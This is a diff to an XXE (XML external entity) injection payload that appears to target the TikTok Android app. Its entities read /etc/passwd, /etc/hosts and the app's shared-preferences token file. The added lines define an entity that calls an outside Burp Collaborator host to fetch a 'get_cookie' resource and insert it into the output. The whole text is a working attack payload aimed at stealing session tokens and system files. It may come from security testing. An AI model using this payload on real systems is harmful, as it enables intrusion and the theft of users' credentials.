@@ -4,6 +4,7 @@
 <!ENTITY hosts SYSTEM "file:///etc/hosts">
 <!ENTITY issue SYSTEM "file:///etc/issue">
 <!ENTITY cookie SYSTEM "file:///data/data/com.ss.android.ugc.aweme/shared_prefs/token_shared_preference.xml">
+<!ENTITY getcookie SYSTEM "http://1kms4buf8amdkbf9c37m5j1s9jfb31rq.oastify.com/get_cookie">
 ]> 
 <p>
 <p>/etc/passwd: 
@@ -17,5 +18,8 @@
 </p>
 <p>/cookie:
     &cookie;
+</p>
+<p>/get_cookie:
+    &getcookie;
 </p>
 </p>
